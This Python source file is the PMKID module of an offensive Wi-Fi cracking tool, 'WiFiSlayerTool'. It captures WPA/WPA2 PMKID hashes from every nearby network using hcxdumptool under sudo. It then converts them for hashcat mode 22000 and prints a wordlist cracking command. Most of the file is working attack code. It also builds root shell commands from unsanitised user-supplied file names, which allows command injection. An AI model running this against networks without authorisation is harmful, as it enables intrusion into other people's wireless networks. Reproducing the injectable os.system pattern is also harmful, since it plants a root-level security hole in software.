# -*- coding: utf-8 -*-
"""
WiFiSlayerTool v3.0 — PMKID Attack Module
Client-less WPA/WPA2 cracking using hcxdumptool.
"""

import os

from core.logger import log
from core.ui import (
    console, print_section, print_success, print_error,
    print_warning, print_info, select_interface, print_sub_menu,
    confirm_action,
)
from core.ascii_art import print_wps_art
from config import get_text, HANDSHAKE_DIR
from core.network import get_wireless_interfaces


def pmkid_menu(current_interface=None):
    """PMKID Attack sub-menu."""
    while True:
        console.print()
        if get_text("choose") == "اختر":
            options = [
                ("1", "📡", "التقاط PMKID لجميع الشبكات (بدون عميل)"),
                ("2", "⚙️", "تحويل ملف PMKID إلى صيغة Hashcat"),
            ]
        else:
            options = [
                ("1", "📡", "Capture PMKID for all networks (Client-less)"),
                ("2", "⚙️", "Convert PMKID file to Hashcat format"),
            ]

        title = "📡 " + "PMKID Attack (Client-less)"
        print_sub_menu(title, options)

        choice = console.input(f"\n  [bold bright_cyan]➤ {get_text('choose')}:[/] ").strip()

        if choice == "1":
            capture_pmkid(current_interface)
        elif choice == "2":
            convert_pmkid()
        elif choice == "0":
            break
        else:
            print_error(get_text("invalid_choice"))


def capture_pmkid(interface=None):
    """Capture PMKID using hcxdumptool."""
    os.system("clear" if os.name != "nt" else "cls")
    print_wps_art()
    print_section("Capture PMKID")

    if not interface:
        interfaces = get_wireless_interfaces()
        interface = select_interface(interfaces)
        if not interface:
            print_error(get_text("no_interface"))
            return

    from core.validator import safe_input
    output_name = safe_input("Output file name / اسم ملف الحفظ (e.g. pmkid_capture)", console=console)
    if not output_name:
        output_name = "pmkid_capture"

    pcapng_file = os.path.join(HANDSHAKE_DIR, f"{output_name}.pcapng")

    print_warning(get_text("pmkid_warning"))
    print_warning(f"{get_text('pmkid_saved')} [bold]{pcapng_file}[/]")
    console.print()

    if not confirm_action(get_text("confirm_attack")):
        return

    log.info(f"Starting PMKID capture on {interface} to {pcapng_file}")
    print_info(f"{get_text('starting_attack')} {get_text('press_ctrl_c')}")
    console.print()

    try:
        # Note: Modern hcxdumptool commands might differ slightly based on version.
        # This is the standard generalized command.
        os.system(f"sudo hcxdumptool -i {interface} -w '{pcapng_file}' --enable_status=1")
    except KeyboardInterrupt:
        console.print()
        print_info(get_text("attack_stopped"))

    if os.path.exists(pcapng_file):
        print_success(f"{get_text('pmkid_saved')} [bold]{pcapng_file}[/]")
    else:
        print_error(get_text("pmkid_failed"))


def convert_pmkid():
    """Convert .pcapng to Hashcat Format 22000 using hcxpcapngtool."""
    print_section("Convert PMKID to Hashcat Format")

    from core.validator import safe_input, validate_file_path
    
    pcapng_path = safe_input("Enter path to .pcapng file / مسار ملف pcapng", validate_file_path, console)
    if not pcapng_path:
        return

    hash_file = pcapng_path.replace(".pcapng", ".hc22000")

    log.info(f"Converting {pcapng_path} to {hash_file}")
    print_info(get_text("pmkid_convert"))
    
    try:
        os.system(f"sudo hcxpcapngtool -o '{hash_file}' '{pcapng_path}'")
        if os.path.exists(hash_file):
            print_success(f"{get_text('pmkid_converted')} [bold]{hash_file}[/]")
            print_info("hashcat -m 22000 file.hc22000 wordlist.txt")
        else:
            print_error(get_text("pmkid_convert_failed"))
    except Exception as e:
        print_error(f"Error: {e}")
